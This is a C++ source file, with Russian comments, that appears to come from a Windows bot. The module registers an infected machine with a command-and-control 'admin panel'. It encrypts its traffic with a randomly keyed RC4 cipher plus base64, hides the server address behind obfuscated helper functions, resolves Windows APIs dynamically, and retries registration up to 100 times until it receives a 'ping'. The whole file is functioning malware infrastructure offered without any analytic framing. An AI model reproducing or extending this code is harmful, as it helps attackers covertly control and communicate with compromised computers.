#include <Windows.h>
#include <stdint.h>
#include "../Utils/Utils.h"
#include "../String/StringHelpers.h"
#include "../Utils/Utils.h"
#include "../Utils/Debug_to_file.h"
#include "../HTTP/HTTP.h"
#include "../DynImport/Api.h"
#include "../Config.h"
#include "../Includes/MemLimits.h"

#include "Crypt.h"
#include "RegBot.h"

#define KEY_SIZE 32

static BYTE serverResponse[MEM_LIMIT];
static BYTE DecResponse[MEM_LIMIT];

static uint8_t ascii[1024 * sizeof(wchar_t)];
static wchar_t unicode[1024];
static wchar_t PostStr[1024];
static unsigned int seed = 0;

int RandInt(int min, int max)
{
	unsigned int offset = 12923;
	unsigned int multiplier = 4079;

	seed = seed * multiplier + offset;
	return (int)(seed % max) + 1;
}

/*
 Генерация случайного ключа длинной 32 символа
*/
static uint8_t* gen_random() {

	byte* str = (byte*)hAlloc(KEY_SIZE + 1);
	if (!str) return nullptr;

	seed = API(KERNEL32, GetTickCount)();
	for (size_t i = 0; i < KEY_SIZE; i++)
	{
		int pos = RandInt(0, StaticData::alphabetSize);
		str[i] = StaticData::alphabet[pos];

		seed += pos;
	}

	str[KEY_SIZE + 1] = '\0';

	return str;
}

//Генерация строки для отправки по алгоритму
uint8_t* gen_data_to_send(uint8_t* to_enc_data, uint32_t size_enc_data) {

	//Генерация ключа для шифрования трафика
	uint8_t* key_for_crypt = gen_random();
	
	//Подготовка данных для отправки
	uint8_t* enc_data = NULL;
	enc_data = (uint8_t*)hAlloc(size_enc_data + 1);
	if (enc_data == NULL) {
		DEBUG_TO_FILE("+++ data_to_send is NULL \r\n");
		return NULL;
	}

	memCpy(enc_data, to_enc_data, size_enc_data);

	//Шифрование botId
	encRC4(key_for_crypt, 32, (uint8_t*)enc_data, size_enc_data);

	//Упаковка данных в BASE64
	uint8_t* data_to_base64 = NULL;
	data_to_base64 = base64_encode(enc_data);
	if (data_to_base64 == NULL) {
		DEBUG_TO_FILE("+++ data_to_send is NULL \r\n");
		return NULL;
	}

	//Формирование итоговых данных для отправки
	uint32_t size_data = 32 + strlen((const char*)data_to_base64) + 1;
	uint8_t* data_to_send = NULL;
	data_to_send = (uint8_t*)hAlloc(size_data);
	if (data_to_send == NULL) {
		DEBUG_TO_FILE("+++ data_to_send is NULL \r\n");
		return NULL;
	}

	//Копирование ключа в начало строки
	memCpy(data_to_send, key_for_crypt, 32);

	//Копирование шифрованной строки
	int size_base64_data = strlen((const char*)(data_to_base64)) + 1;
	memCpy(data_to_send + 32, data_to_base64, size_base64_data);

	//Освобождение памяти
	hFree(data_to_base64);
	hFree(enc_data);

	return data_to_send;
}

//Расшифровка принятых данных по алгоритму
bool decrypt_recv_data(uint8_t* enc_data, uint32_t size_enc_data, uint8_t* dec_data) {

	uint8_t* data_to_base64 = nullptr;

	DEBUG_TO_FILE("+++ ENC_RECV_DATA:%s \r\n", enc_data);

	data_to_base64 = base64_decode(enc_data + 32);
	if (data_to_base64 == nullptr) {
		DEBUG_TO_FILE("+++ data_to_send is NULL \r\n");
		return false;
	}

	//Расшифровка
	decRC4(enc_data, 32, (uint8_t*)data_to_base64, size_enc_data);
	memCpy(dec_data, data_to_base64, size_enc_data);

	DEBUG_TO_FILE("+++ DEC_RECV_DATA:%s \r\n", dec_data);

	//Освобождение памяти
	hFree(data_to_base64);

	return true;
}

bool post_send_recv_bot(wchar_t* admin_addr,
	wchar_t* path_to_admin,
	wchar_t* post_recv,
	BYTE* decServerResponse) {

	DWORD serverResponseSize = 0;
	DWORD ret_code = (-1);
	uint8_t* data_to_send = nullptr;

	UnicodeToASCII(post_recv, (char*)ascii);

	uint32_t size_data = strLenA((const char*)ascii) + 1;

	data_to_send = gen_data_to_send(ascii, size_data);
	if (data_to_send == nullptr) {
		DEBUG_TO_FILE("+++ data_to_send is NULL \r\n");
		ExitProcess(0);
	}

	ASCIIToUnicode((char*)data_to_send, unicode);

	//Посылка запроса в админку на регистрацию бота
	API(USER32, wsprintfW) (PostStr, L"tes=1&data=%s", unicode);

	ret_code = PostRequest(admin_addr, 0, path_to_admin, PostStr, &serverResponseSize, serverResponse);
	//Расшифровка ответа
	if ((ret_code == 0) && (serverResponseSize != 0)) {
		decrypt_recv_data(serverResponse, serverResponseSize - 32, decServerResponse);
		hFree(data_to_send);
		return true;
	}
	else {
		//DEBUG_TO_FILE("+++ Bad or null data from admin: ret_code = %d serverResponseSize = %d \r\n", ret_code, serverResponseSize);
		hFree(data_to_send);
		return false;
	}
}

//Регистрация бота в админке
//Попытка регистрации (Отправка запроса и ожидание прихода ping), 100 итераций, иначе ошибка и выход из программы
bool bot_reg(wchar_t* req) {
	bool ret_code = false;
	int count = 0;
	char* recv_code = NULL;
	for (count = 0; count < 100; count++) {
		ret_code = post_send_recv_bot(hide_admin_path(), hide_reg_path(), (wchar_t*)req, DecResponse);
		if (ret_code == true) {
			recv_code = strTokA((char*)DecResponse, "|");
			if (recv_code != NULL) {
				//Проверяем пришел-ли ответ ping
				if (!strCmpA(recv_code, hide_str_ping())) {
					break;
				}
			}
		}
		//Задержка секунду.
		API(KERNEL32, Sleep)(TIME_SLEEP);
	}

	if (count < 100) {
		//Регистрация прошла
		return true;
	}
	else {
		//Регистрация не прошла.
		return false;
	}
}